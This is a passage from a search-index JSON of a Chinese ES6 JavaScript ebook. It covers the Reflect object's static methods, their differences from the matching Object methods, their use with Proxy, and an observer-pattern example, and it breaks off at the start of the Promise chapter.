<p>\uff084\uff09<code>Reflect</code>\u5bf9\u8c61\u7684\u65b9\u6cd5\u4e0e<code>Proxy</code>\u5bf9\u8c61\u7684\u65b9\u6cd5\u4e00\u4e00\u5bf9\u5e94\uff0c\u53ea\u8981\u662f<code>Proxy</code>\u5bf9\u8c61\u7684\u65b9\u6cd5\uff0c\u5c31\u80fd\u5728<code>Reflect</code>\u5bf9\u8c61\u4e0a\u627e\u5230\u5bf9\u5e94\u7684\u65b9\u6cd5\u3002\u8fd9\u5c31\u8ba9<code>Proxy</code>\u5bf9\u8c61\u53ef\u4ee5\u65b9\u4fbf\u5730\u8c03\u7528\u5bf9\u5e94\u7684<code>Reflect</code>\u65b9\u6cd5\uff0c\u5b8c\u6210\u9ed8\u8ba4\u884c\u4e3a\uff0c\u4f5c\u4e3a\u4fee\u6539\u884c\u4e3a\u7684\u57fa\u7840\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0d\u7ba1<code>Proxy</code>\u600e\u4e48\u4fee\u6539\u9ed8\u8ba4\u884c\u4e3a\uff0c\u4f60\u603b\u53ef\u4ee5\u5728<code>Reflect</code>\u4e0a\u83b7\u53d6\u9ed8\u8ba4\u884c\u4e3a\u3002</p> <pre><code>Proxy(target, {\n  set: function(target, name, value, receiver) {\n    var success = Reflect.set(target, name, value, receiver);\n    if (success) {\n      console.log('property ' + name + ' on ' + target + ' set to ' + value);\n    }\n    return success;\n  }\n});\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>Proxy</code>\u65b9\u6cd5\u62e6\u622a<code>target</code>\u5bf9\u8c61\u7684\u5c5e\u6027\u8d4b\u503c\u884c\u4e3a\u3002\u5b83\u91c7\u7528<code>Reflect.set</code>\u65b9\u6cd5\u5c06\u503c\u8d4b\u503c\u7ed9\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u786e\u4fdd\u5b8c\u6210\u539f\u6709\u7684\u884c\u4e3a\uff0c\u7136\u540e\u518d\u90e8\u7f72\u989d\u5916\u7684\u529f\u80fd\u3002</p> <p>\u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>var loddedObj = new Proxy(obj, {\n  get(target, name) {\n    return Reflect.get(target, name);\n  },\n  deleteProperty(target, name) {\n    return Reflect.deleteProperty(target, name);\n  },\n  has(target, name) {\n    return Reflect.has(target, name);\n  }\n});\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6bcf\u4e00\u4e2a<code>Proxy</code>\u5bf9\u8c61\u7684\u62e6\u622a\u64cd\u4f5c\uff08<code>get</code>\u3001<code>delete</code>\u3001<code>has</code>\uff09\uff0c\u5185\u90e8\u90fd\u8c03\u7528\u5bf9\u5e94\u7684<code>Reflect</code>\u65b9\u6cd5\uff0c\u4fdd\u8bc1\u539f\u751f\u884c\u4e3a\u80fd\u591f\u6b63\u5e38\u6267\u884c\u3002\u6dfb\u52a0\u7684\u5de5\u4f5c\uff0c\u5c31\u662f\u5c06\u6bcf\u4e00\u4e2a\u64cd\u4f5c\u8f93\u51fa\u4e00\u884c\u65e5\u5fd7\u3002</p> <p>\u6709\u4e86<code>Reflect</code>\u5bf9\u8c61\u4ee5\u540e\uff0c\u5f88\u591a\u64cd\u4f5c\u4f1a\u66f4\u6613\u8bfb\u3002</p> <pre><code>Function.prototype.apply.call(Math.floor, undefined, [1.75]);\nReflect.apply(Math.floor, undefined, [1.75]);\n</code></pre>"},{"location":"ebook-JSES6-RYF/15-Reflect/#_2","title":"\u9759\u6001\u65b9\u6cd5","text":"<p><code>Reflect</code>\u5bf9\u8c61\u4e00\u5171\u6709 13 \u4e2a\u9759\u6001\u65b9\u6cd5\u3002</p> <ul> <li>Reflect.apply(target, thisArg, args)</li> <li>Reflect.construct(target, args)</li> <li>Reflect.get(target, name, receiver)</li> <li>Reflect.set(target, name, value, receiver)</li> <li>Reflect.defineProperty(target, name, desc)</li> <li>Reflect.deleteProperty(target, name)</li> <li>Reflect.has(target, name)</li> <li>Reflect.ownKeys(target)</li> <li>Reflect.isExtensible(target)</li> <li>Reflect.preventExtensions(target)</li> <li>Reflect.getOwnPropertyDescriptor(target, name)</li> <li>Reflect.getPrototypeOf(target)</li> <li>Reflect.setPrototypeOf(target, prototype)</li> </ul> <p>\u4e0a\u9762\u8fd9\u4e9b\u65b9\u6cd5\u7684\u4f5c\u7528\uff0c\u5927\u90e8\u5206\u4e0e<code>Object</code>\u5bf9\u8c61\u7684\u540c\u540d\u65b9\u6cd5\u7684\u4f5c\u7528\u90fd\u662f\u76f8\u540c\u7684\uff0c\u800c\u4e14\u5b83\u4e0e<code>Proxy</code>\u5bf9\u8c61\u7684\u65b9\u6cd5\u662f\u4e00\u4e00\u5bf9\u5e94\u7684\u3002\u4e0b\u9762\u662f\u5bf9\u5b83\u4eec\u7684\u89e3\u91ca\u3002</p>"},{"location":"ebook-JSES6-RYF/15-Reflect/#reflectgettarget-name-receiver","title":"Reflect.get(target, name, receiver)","text":"<p><code>Reflect.get</code>\u65b9\u6cd5\u67e5\u627e\u5e76\u8fd4\u56de<code>target</code>\u5bf9\u8c61\u7684<code>name</code>\u5c5e\u6027\uff0c\u5982\u679c\u6ca1\u6709\u8be5\u5c5e\u6027\uff0c\u5219\u8fd4\u56de<code>undefined</code>\u3002</p> <pre><code>var myObject = {\n  foo: 1,\n  bar: 2,\n  get baz() {\n    return this.foo + this.bar;\n  },\n}\n\nReflect.get(myObject, 'foo') // 1\nReflect.get(myObject, 'bar') // 2\nReflect.get(myObject, 'baz') // 3\n</code></pre> <p>\u5982\u679c<code>name</code>\u5c5e\u6027\u90e8\u7f72\u4e86\u8bfb\u53d6\u51fd\u6570\uff08getter\uff09\uff0c\u5219\u8bfb\u53d6\u51fd\u6570\u7684<code>this</code>\u7ed1\u5b9a<code>receiver</code>\u3002</p> <pre><code>var myObject = {\n  foo: 1,\n  bar: 2,\n  get baz() {\n    return this.foo + this.bar;\n  },\n};\n\nvar myReceiverObject = {\n  foo: 4,\n  bar: 4,\n};\n\nReflect.get(myObject, 'baz', myReceiverObject) // 8\n</code></pre> <p>\u5982\u679c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e0d\u662f\u5bf9\u8c61\uff0c<code>Reflect.get</code>\u65b9\u6cd5\u4f1a\u62a5\u9519\u3002</p> <pre><code>Reflect.get(1, 'foo') // \u62a5\u9519\nReflect.get(false, 'foo') // \u62a5\u9519\n</code></pre>"},{"location":"ebook-JSES6-RYF/15-Reflect/#reflectsettarget-name-value-receiver","title":"Reflect.set(target, name, value, receiver)","text":"<p><code>Reflect.set</code>\u65b9\u6cd5\u8bbe\u7f6e<code>target</code>\u5bf9\u8c61\u7684<code>name</code>\u5c5e\u6027\u7b49\u4e8e<code>value</code>\u3002</p> <pre><code>var myObject = {\n  foo: 1,\n  set bar(value) {\n    return this.foo = value;\n  },\n}\n\nmyObject.foo // 1\n\nReflect.set(myObject, 'foo', 2);\nmyObject.foo // 2\n\nReflect.set(myObject, 'bar', 3)\nmyObject.foo // 3\n</code></pre> <p>\u5982\u679c<code>name</code>\u5c5e\u6027\u8bbe\u7f6e\u4e86\u8d4b\u503c\u51fd\u6570\uff0c\u5219\u8d4b\u503c\u51fd\u6570\u7684<code>this</code>\u7ed1\u5b9a<code>receiver</code>\u3002</p> <pre><code>var myObject = {\n  foo: 4,\n  set bar(value) {\n    return this.foo = value;\n  },\n};\n\nvar myReceiverObject = {\n  foo: 0,\n};\n\nReflect.set(myObject, 'bar', 1, myReceiverObject);\nmyObject.foo // 4\nmyReceiverObject.foo // 1\n</code></pre> <p>\u6ce8\u610f\uff0c\u5982\u679c <code>Proxy</code>\u5bf9\u8c61\u548c <code>Reflect</code>\u5bf9\u8c61\u8054\u5408\u4f7f\u7528\uff0c\u524d\u8005\u62e6\u622a\u8d4b\u503c\u64cd\u4f5c\uff0c\u540e\u8005\u5b8c\u6210\u8d4b\u503c\u7684\u9ed8\u8ba4\u884c\u4e3a\uff0c\u800c\u4e14\u4f20\u5165\u4e86<code>receiver</code>\uff0c\u90a3\u4e48<code>Reflect.set</code>\u4f1a\u89e6\u53d1<code>Proxy.defineProperty</code>\u62e6\u622a\u3002</p> <pre><code>let p = {\n  a: 'a'\n};\n\nlet handler = {\n  set(target, key, value, receiver) {\n    console.log('set');\n    Reflect.set(target, key, value, receiver)\n  },\n  defineProperty(target, key, attribute) {\n    console.log('defineProperty');\n    Reflect.defineProperty(target, key, attribute);\n  }\n};\n\nlet obj = new Proxy(p, handler);\nobj.a = 'A';\n// set\n// defineProperty\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>Proxy.set</code>\u62e6\u622a\u91cc\u9762\u4f7f\u7528\u4e86<code>Reflect.set</code>\uff0c\u800c\u4e14\u4f20\u5165\u4e86<code>receiver</code>\uff0c\u5bfc\u81f4\u89e6\u53d1<code>Proxy.defineProperty</code>\u62e6\u622a\u3002\u8fd9\u662f\u56e0\u4e3a<code>Proxy.set</code>\u7684<code>receiver</code>\u53c2\u6570\u603b\u662f\u6307\u5411\u5f53\u524d\u7684 <code>Proxy</code>\u5b9e\u4f8b\uff08\u5373\u4e0a\u4f8b\u7684<code>obj</code>\uff09\uff0c\u800c<code>Reflect.set</code>\u4e00\u65e6\u4f20\u5165<code>receiver</code>\uff0c\u5c31\u4f1a\u5c06\u5c5e\u6027\u8d4b\u503c\u5230<code>receiver</code>\u4e0a\u9762\uff08\u5373<code>obj</code>\uff09\uff0c\u5bfc\u81f4\u89e6\u53d1<code>defineProperty</code>\u62e6\u622a\u3002\u5982\u679c<code>Reflect.set</code>\u6ca1\u6709\u4f20\u5165<code>receiver</code>\uff0c\u90a3\u4e48\u5c31\u4e0d\u4f1a\u89e6\u53d1<code>defineProperty</code>\u62e6\u622a\u3002</p> <pre><code>let p = {\n  a: 'a'\n};\n\nlet handler = {\n  set(target, key, value, receiver) {\n    console.log('set');\n    Reflect.set(target, key, value)\n  },\n  defineProperty(target, key, attribute) {\n    console.log('defineProperty');\n    Reflect.defineProperty(target, key, attribute);\n  }\n};\n\nlet obj = new Proxy(p, handler);\nobj.a = 'A';\n// set\n</code></pre> <p>\u5982\u679c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e0d\u662f\u5bf9\u8c61\uff0c<code>Reflect.set</code>\u4f1a\u62a5\u9519\u3002</p> <pre><code>Reflect.set(1, 'foo', {}) // \u62a5\u9519\nReflect.set(false, 'foo', {}) // \u62a5\u9519\n</code></pre>"},{"location":"ebook-JSES6-RYF/15-Reflect/#reflecthasobj-name","title":"Reflect.has(obj, name)","text":"<p><code>Reflect.has</code>\u65b9\u6cd5\u5bf9\u5e94<code>name in obj</code>\u91cc\u9762\u7684<code>in</code>\u8fd0\u7b97\u7b26\u3002</p> <pre><code>var myObject = {\n  foo: 1,\n};\n\n// \u65e7\u5199\u6cd5\n'foo' in myObject // true\n\n// \u65b0\u5199\u6cd5\nReflect.has(myObject, 'foo') // true\n</code></pre> <p>\u5982\u679c<code>Reflect.has()</code>\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e0d\u662f\u5bf9\u8c61\uff0c\u4f1a\u62a5\u9519\u3002</p>"},{"location":"ebook-JSES6-RYF/15-Reflect/#reflectdeletepropertyobj-name","title":"Reflect.deleteProperty(obj, name)","text":"<p><code>Reflect.deleteProperty</code>\u65b9\u6cd5\u7b49\u540c\u4e8e<code>delete obj[name]</code>\uff0c\u7528\u4e8e\u5220\u9664\u5bf9\u8c61\u7684\u5c5e\u6027\u3002</p> <pre><code>const myObj = { foo: 'bar' };\n\n// \u65e7\u5199\u6cd5\ndelete myObj.foo;\n\n// \u65b0\u5199\u6cd5\nReflect.deleteProperty(myObj, 'foo');\n</code></pre> <p>\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\u3002\u5982\u679c\u5220\u9664\u6210\u529f\uff0c\u6216\u8005\u88ab\u5220\u9664\u7684\u5c5e\u6027\u4e0d\u5b58\u5728\uff0c\u8fd4\u56de<code>true</code>\uff1b\u5220\u9664\u5931\u8d25\uff0c\u88ab\u5220\u9664\u7684\u5c5e\u6027\u4f9d\u7136\u5b58\u5728\uff0c\u8fd4\u56de<code>false</code>\u3002</p> <p>\u5982\u679c<code>Reflect.deleteProperty()</code>\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e0d\u662f\u5bf9\u8c61\uff0c\u4f1a\u62a5\u9519\u3002</p>"},{"location":"ebook-JSES6-RYF/15-Reflect/#reflectconstructtarget-args","title":"Reflect.construct(target, args)","text":"<p><code>Reflect.construct</code>\u65b9\u6cd5\u7b49\u540c\u4e8e<code>new target(...args)</code>\uff0c\u8fd9\u63d0\u4f9b\u4e86\u4e00\u79cd\u4e0d\u4f7f\u7528<code>new</code>\uff0c\u6765\u8c03\u7528\u6784\u9020\u51fd\u6570\u7684\u65b9\u6cd5\u3002</p> <pre><code>function Greeting(name) {\n  this.name = name;\n}\n\n// new \u7684\u5199\u6cd5\nconst instance = new Greeting('\u5f20\u4e09');\n\n// Reflect.construct \u7684\u5199\u6cd5\nconst instance = Reflect.construct(Greeting, ['\u5f20\u4e09']);\n</code></pre> <p>\u5982\u679c<code>Reflect.construct()</code>\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e0d\u662f\u51fd\u6570\uff0c\u4f1a\u62a5\u9519\u3002</p>"},{"location":"ebook-JSES6-RYF/15-Reflect/#reflectgetprototypeofobj","title":"Reflect.getPrototypeOf(obj)","text":"<p><code>Reflect.getPrototypeOf</code>\u65b9\u6cd5\u7528\u4e8e\u8bfb\u53d6\u5bf9\u8c61\u7684<code>__proto__</code>\u5c5e\u6027\uff0c\u5bf9\u5e94<code>Object.getPrototypeOf(obj)</code>\u3002</p> <pre><code>const myObj = new FancyThing();\n\n// \u65e7\u5199\u6cd5\nObject.getPrototypeOf(myObj) === FancyThing.prototype;\n\n// \u65b0\u5199\u6cd5\nReflect.getPrototypeOf(myObj) === FancyThing.prototype;\n</code></pre> <p><code>Reflect.getPrototypeOf</code>\u548c<code>Object.getPrototypeOf</code>\u7684\u4e00\u4e2a\u533a\u522b\u662f\uff0c\u5982\u679c\u53c2\u6570\u4e0d\u662f\u5bf9\u8c61\uff0c<code>Object.getPrototypeOf</code>\u4f1a\u5c06\u8fd9\u4e2a\u53c2\u6570\u8f6c\u4e3a\u5bf9\u8c61\uff0c\u7136\u540e\u518d\u8fd0\u884c\uff0c\u800c<code>Reflect.getPrototypeOf</code>\u4f1a\u62a5\u9519\u3002</p> <pre><code>Object.getPrototypeOf(1) // Number {[[PrimitiveValue]]: 0}\nReflect.getPrototypeOf(1) // \u62a5\u9519\n</code></pre>"},{"location":"ebook-JSES6-RYF/15-Reflect/#reflectsetprototypeofobj-newproto","title":"Reflect.setPrototypeOf(obj, newProto)","text":"<p><code>Reflect.setPrototypeOf</code>\u65b9\u6cd5\u7528\u4e8e\u8bbe\u7f6e\u76ee\u6807\u5bf9\u8c61\u7684\u539f\u578b\uff08prototype\uff09\uff0c\u5bf9\u5e94<code>Object.setPrototypeOf(obj, newProto)</code>\u65b9\u6cd5\u3002\u5b83\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u8bbe\u7f6e\u6210\u529f\u3002</p> <pre><code>const myObj = {};\n\n// \u65e7\u5199\u6cd5\nObject.setPrototypeOf(myObj, Array.prototype);\n\n// \u65b0\u5199\u6cd5\nReflect.setPrototypeOf(myObj, Array.prototype);\n\nmyObj.length // 0\n</code></pre> <p>\u5982\u679c\u65e0\u6cd5\u8bbe\u7f6e\u76ee\u6807\u5bf9\u8c61\u7684\u539f\u578b\uff08\u6bd4\u5982\uff0c\u76ee\u6807\u5bf9\u8c61\u7981\u6b62\u6269\u5c55\uff09\uff0c<code>Reflect.setPrototypeOf</code>\u65b9\u6cd5\u8fd4\u56de<code>false</code>\u3002</p> <pre><code>Reflect.setPrototypeOf({}, null)\n// true\nReflect.setPrototypeOf(Object.freeze({}), null)\n// false\n</code></pre> <p>\u5982\u679c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e0d\u662f\u5bf9\u8c61\uff0c<code>Object.setPrototypeOf</code>\u4f1a\u8fd4\u56de\u7b2c\u4e00\u4e2a\u53c2\u6570\u672c\u8eab\uff0c\u800c<code>Reflect.setPrototypeOf</code>\u4f1a\u62a5\u9519\u3002</p> <pre><code>Object.setPrototypeOf(1, {})\n// 1\n\nReflect.setPrototypeOf(1, {})\n// TypeError: Reflect.setPrototypeOf called on non-object\n</code></pre> <p>\u5982\u679c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f<code>undefined</code>\u6216<code>null</code>\uff0c<code>Object.setPrototypeOf</code>\u548c<code>Reflect.setPrototypeOf</code>\u90fd\u4f1a\u62a5\u9519\u3002</p> <pre><code>Object.setPrototypeOf(null, {})\n// TypeError: Object.setPrototypeOf called on null or undefined\n\nReflect.setPrototypeOf(null, {})\n// TypeError: Reflect.setPrototypeOf called on non-object\n</code></pre>"},{"location":"ebook-JSES6-RYF/15-Reflect/#reflectapplyfunc-thisarg-args","title":"Reflect.apply(func, thisArg, args)","text":"<p><code>Reflect.apply</code>\u65b9\u6cd5\u7b49\u540c\u4e8e<code>Function.prototype.apply.call(func, thisArg, args)</code>\uff0c\u7528\u4e8e\u7ed1\u5b9a<code>this</code>\u5bf9\u8c61\u540e\u6267\u884c\u7ed9\u5b9a\u51fd\u6570\u3002</p> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u8981\u7ed1\u5b9a\u4e00\u4e2a\u51fd\u6570\u7684<code>this</code>\u5bf9\u8c61\uff0c\u53ef\u4ee5\u8fd9\u6837\u5199<code>fn.apply(obj, args)</code>\uff0c\u4f46\u662f\u5982\u679c\u51fd\u6570\u5b9a\u4e49\u4e86\u81ea\u5df1\u7684<code>apply</code>\u65b9\u6cd5\uff0c\u5c31\u53ea\u80fd\u5199\u6210<code>Function.prototype.apply.call(fn, obj, args)</code>\uff0c\u91c7\u7528<code>Reflect</code>\u5bf9\u8c61\u53ef\u4ee5\u7b80\u5316\u8fd9\u79cd\u64cd\u4f5c\u3002</p> <pre><code>const ages = [11, 33, 12, 54, 18, 96];\n\n// \u65e7\u5199\u6cd5\nconst youngest = Math.min.apply(Math, ages);\nconst oldest = Math.max.apply(Math, ages);\nconst type = Object.prototype.toString.call(youngest);\n\n// \u65b0\u5199\u6cd5\nconst youngest = Reflect.apply(Math.min, Math, ages);\nconst oldest = Reflect.apply(Math.max, Math, ages);\nconst type = Reflect.apply(Object.prototype.toString, youngest, []);\n</code></pre>"},{"location":"ebook-JSES6-RYF/15-Reflect/#reflectdefinepropertytarget-propertykey-attributes","title":"Reflect.defineProperty(target, propertyKey, attributes)","text":"<p><code>Reflect.defineProperty</code>\u65b9\u6cd5\u57fa\u672c\u7b49\u540c\u4e8e<code>Object.defineProperty</code>\uff0c\u7528\u6765\u4e3a\u5bf9\u8c61\u5b9a\u4e49\u5c5e\u6027\u3002\u672a\u6765\uff0c\u540e\u8005\u4f1a\u88ab\u9010\u6e10\u5e9f\u9664\uff0c\u8bf7\u4ece\u73b0\u5728\u5f00\u59cb\u5c31\u4f7f\u7528<code>Reflect.defineProperty</code>\u4ee3\u66ff\u5b83\u3002</p> <pre><code>function MyDate() {\n  /*\u2026*/\n}\n\n// \u65e7\u5199\u6cd5\nObject.defineProperty(MyDate, 'now', {\n  value: () =&gt; Date.now()\n});\n\n// \u65b0\u5199\u6cd5\nReflect.defineProperty(MyDate, 'now', {\n  value: () =&gt; Date.now()\n});\n</code></pre> <p>\u5982\u679c<code>Reflect.defineProperty</code>\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e0d\u662f\u5bf9\u8c61\uff0c\u5c31\u4f1a\u629b\u51fa\u9519\u8bef\uff0c\u6bd4\u5982<code>Reflect.defineProperty(1, 'foo')</code>\u3002</p> <p>\u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u4e0e<code>Proxy.defineProperty</code>\u914d\u5408\u4f7f\u7528\u3002</p> <pre><code>const p = new Proxy({}, {\n  defineProperty(target, prop, descriptor) {\n    console.log(descriptor);\n    return Reflect.defineProperty(target, prop, descriptor);\n  }\n});\n\np.foo = 'bar';\n// {value: \"bar\", writable: true, enumerable: true, configurable: true}\n\np.foo // \"bar\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>Proxy.defineProperty</code>\u5bf9\u5c5e\u6027\u8d4b\u503c\u8bbe\u7f6e\u4e86\u62e6\u622a\uff0c\u7136\u540e\u4f7f\u7528<code>Reflect.defineProperty</code>\u5b8c\u6210\u4e86\u8d4b\u503c\u3002</p>"},{"location":"ebook-JSES6-RYF/15-Reflect/#reflectgetownpropertydescriptortarget-propertykey","title":"Reflect.getOwnPropertyDescriptor(target, propertyKey)","text":"<p><code>Reflect.getOwnPropertyDescriptor</code>\u57fa\u672c\u7b49\u540c\u4e8e<code>Object.getOwnPropertyDescriptor</code>\uff0c\u7528\u4e8e\u5f97\u5230\u6307\u5b9a\u5c5e\u6027\u7684\u63cf\u8ff0\u5bf9\u8c61\uff0c\u5c06\u6765\u4f1a\u66ff\u4ee3\u6389\u540e\u8005\u3002</p> <pre><code>var myObject = {};\nObject.defineProperty(myObject, 'hidden', {\n  value: true,\n  enumerable: false,\n});\n\n// \u65e7\u5199\u6cd5\nvar theDescriptor = Object.getOwnPropertyDescriptor(myObject, 'hidden');\n\n// \u65b0\u5199\u6cd5\nvar theDescriptor = Reflect.getOwnPropertyDescriptor(myObject, 'hidden');\n</code></pre> <p><code>Reflect.getOwnPropertyDescriptor</code>\u548c<code>Object.getOwnPropertyDescriptor</code>\u7684\u4e00\u4e2a\u533a\u522b\u662f\uff0c\u5982\u679c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e0d\u662f\u5bf9\u8c61\uff0c<code>Object.getOwnPropertyDescriptor(1, 'foo')</code>\u4e0d\u62a5\u9519\uff0c\u8fd4\u56de<code>undefined</code>\uff0c\u800c<code>Reflect.getOwnPropertyDescriptor(1, 'foo')</code>\u4f1a\u629b\u51fa\u9519\u8bef\uff0c\u8868\u793a\u53c2\u6570\u975e\u6cd5\u3002</p>"},{"location":"ebook-JSES6-RYF/15-Reflect/#reflectisextensible-target","title":"Reflect.isExtensible (target)","text":"<p><code>Reflect.isExtensible</code>\u65b9\u6cd5\u5bf9\u5e94<code>Object.isExtensible</code>\uff0c\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u5bf9\u8c61\u662f\u5426\u53ef\u6269\u5c55\u3002</p> <pre><code>const myObject = {};\n\n// \u65e7\u5199\u6cd5\nObject.isExtensible(myObject) // true\n\n// \u65b0\u5199\u6cd5\nReflect.isExtensible(myObject) // true\n</code></pre> <p>\u5982\u679c\u53c2\u6570\u4e0d\u662f\u5bf9\u8c61\uff0c<code>Object.isExtensible</code>\u4f1a\u8fd4\u56de<code>false</code>\uff0c\u56e0\u4e3a\u975e\u5bf9\u8c61\u672c\u6765\u5c31\u662f\u4e0d\u53ef\u6269\u5c55\u7684\uff0c\u800c<code>Reflect.isExtensible</code>\u4f1a\u62a5\u9519\u3002</p> <pre><code>Object.isExtensible(1) // false\nReflect.isExtensible(1) // \u62a5\u9519\n</code></pre>"},{"location":"ebook-JSES6-RYF/15-Reflect/#reflectpreventextensionstarget","title":"Reflect.preventExtensions(target)","text":"<p><code>Reflect.preventExtensions</code>\u5bf9\u5e94<code>Object.preventExtensions</code>\u65b9\u6cd5\uff0c\u7528\u4e8e\u8ba9\u4e00\u4e2a\u5bf9\u8c61\u53d8\u4e3a\u4e0d\u53ef\u6269\u5c55\u3002\u5b83\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u64cd\u4f5c\u6210\u529f\u3002</p> <pre><code>var myObject = {};\n\n// \u65e7\u5199\u6cd5\nObject.preventExtensions(myObject) // Object {}\n\n// \u65b0\u5199\u6cd5\nReflect.preventExtensions(myObject) // true\n</code></pre> <p>\u5982\u679c\u53c2\u6570\u4e0d\u662f\u5bf9\u8c61\uff0c<code>Object.preventExtensions</code>\u5728 ES5 \u73af\u5883\u62a5\u9519\uff0c\u5728 ES6 \u73af\u5883\u8fd4\u56de\u4f20\u5165\u7684\u53c2\u6570\uff0c\u800c<code>Reflect.preventExtensions</code>\u4f1a\u62a5\u9519\u3002</p> <pre><code>// ES5 \u73af\u5883\nObject.preventExtensions(1) // \u62a5\u9519\n\n// ES6 \u73af\u5883\nObject.preventExtensions(1) // 1\n\n// \u65b0\u5199\u6cd5\nReflect.preventExtensions(1) // \u62a5\u9519\n</code></pre>"},{"location":"ebook-JSES6-RYF/15-Reflect/#reflectownkeys-target","title":"Reflect.ownKeys (target)","text":"<p><code>Reflect.ownKeys</code>\u65b9\u6cd5\u7528\u4e8e\u8fd4\u56de\u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027\uff0c\u57fa\u672c\u7b49\u540c\u4e8e<code>Object.getOwnPropertyNames</code>\u4e0e<code>Object.getOwnPropertySymbols</code>\u4e4b\u548c\u3002</p> <pre><code>var myObject = {\n  foo: 1,\n  bar: 2,\n  [Symbol.for('baz')]: 3,\n  [Symbol.for('bing')]: 4,\n};\n\n// \u65e7\u5199\u6cd5\nObject.getOwnPropertyNames(myObject)\n// ['foo', 'bar']\n\nObject.getOwnPropertySymbols(myObject)\n//[Symbol(baz), Symbol(bing)]\n\n// \u65b0\u5199\u6cd5\nReflect.ownKeys(myObject)\n// ['foo', 'bar', Symbol(baz), Symbol(bing)]\n</code></pre> <p>\u5982\u679c<code>Reflect.ownKeys()</code>\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e0d\u662f\u5bf9\u8c61\uff0c\u4f1a\u62a5\u9519\u3002</p>"},{"location":"ebook-JSES6-RYF/15-Reflect/#proxy","title":"\u5b9e\u4f8b\uff1a\u4f7f\u7528 Proxy \u5b9e\u73b0\u89c2\u5bdf\u8005\u6a21\u5f0f","text":"<p>\u89c2\u5bdf\u8005\u6a21\u5f0f\uff08Observer mode\uff09\u6307\u7684\u662f\u51fd\u6570\u81ea\u52a8\u89c2\u5bdf\u6570\u636e\u5bf9\u8c61\uff0c\u4e00\u65e6\u5bf9\u8c61\u6709\u53d8\u5316\uff0c\u51fd\u6570\u5c31\u4f1a\u81ea\u52a8\u6267\u884c\u3002</p> <pre><code>const person = observable({\n  name: '\u5f20\u4e09',\n  age: 20\n});\n\nfunction print() {\n  console.log(`${person.name}, ${person.age}`)\n}\n\nobserve(print);\nperson.name = '\u674e\u56db';\n// \u8f93\u51fa\n// \u674e\u56db, 20\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u636e\u5bf9\u8c61<code>person</code>\u662f\u89c2\u5bdf\u76ee\u6807\uff0c\u51fd\u6570<code>print</code>\u662f\u89c2\u5bdf\u8005\u3002\u4e00\u65e6\u6570\u636e\u5bf9\u8c61\u53d1\u751f\u53d8\u5316\uff0c<code>print</code>\u5c31\u4f1a\u81ea\u52a8\u6267\u884c\u3002</p> <p>\u4e0b\u9762\uff0c\u4f7f\u7528 Proxy \u5199\u4e00\u4e2a\u89c2\u5bdf\u8005\u6a21\u5f0f\u7684\u6700\u7b80\u5355\u5b9e\u73b0\uff0c\u5373\u5b9e\u73b0<code>observable</code>\u548c<code>observe</code>\u8fd9\u4e24\u4e2a\u51fd\u6570\u3002\u601d\u8def\u662f<code>observable</code>\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a\u539f\u59cb\u5bf9\u8c61\u7684 Proxy \u4ee3\u7406\uff0c\u62e6\u622a\u8d4b\u503c\u64cd\u4f5c\uff0c\u89e6\u53d1\u5145\u5f53\u89c2\u5bdf\u8005\u7684\u5404\u4e2a\u51fd\u6570\u3002</p> <pre><code>const queuedObservers = new Set();\n\nconst observe = fn =&gt; queuedObservers.add(fn);\nconst observable = obj =&gt; new Proxy(obj, {set});\n\nfunction set(target, key, value, receiver) {\n  const result = Reflect.set(target, key, value, receiver);\n  queuedObservers.forEach(observer =&gt; observer());\n  return result;\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5148\u5b9a\u4e49\u4e86\u4e00\u4e2a<code>Set</code>\u96c6\u5408\uff0c\u6240\u6709\u89c2\u5bdf\u8005\u51fd\u6570\u90fd\u653e\u8fdb\u8fd9\u4e2a\u96c6\u5408\u3002\u7136\u540e\uff0c<code>observable</code>\u51fd\u6570\u8fd4\u56de\u539f\u59cb\u5bf9\u8c61\u7684\u4ee3\u7406\uff0c\u62e6\u622a\u8d4b\u503c\u64cd\u4f5c\u3002\u62e6\u622a\u51fd\u6570<code>set</code>\u4e4b\u4e2d\uff0c\u4f1a\u81ea\u52a8\u6267\u884c\u6240\u6709\u89c2\u5bdf\u8005\u3002</p>"},{"location":"ebook-JSES6-RYF/16-Promise/","title":"16 Promise","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 31263  \u9605\u8bfb63\u5206\u949f</p>"},{"location":"ebook-JSES6-RYF/16-Promise/#_1","title":"\u4ecb\u7ecd","text":"<p>Promise 